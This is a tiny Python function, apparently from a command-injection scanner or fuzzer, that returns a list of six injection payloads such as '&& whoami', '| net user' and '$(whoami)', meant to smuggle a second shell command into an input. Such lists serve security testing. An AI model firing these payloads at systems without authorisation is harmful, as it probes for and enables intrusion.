
def get_payloads():
    return [
        "&& whoami",
        "| net user",
        "; ls",
        "`whoami`",
        "$(whoami)",
        "|| dir"
    ]
